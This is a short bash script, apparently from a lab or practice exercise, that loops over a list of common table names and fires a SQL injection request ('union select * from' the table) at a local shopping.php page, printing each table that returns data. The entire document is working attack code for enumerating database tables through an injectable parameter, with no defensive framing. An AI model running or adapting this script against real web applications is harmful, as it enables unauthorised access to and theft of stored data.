cat common-tables.txt | while read table_name
do
  data=$(wget "localhost:80/shopping.php?id=0 union select * from $table_name" -q -O -)
  if [ ! -z "$data" ]
    then
      echo "$table_name"
    fi
done

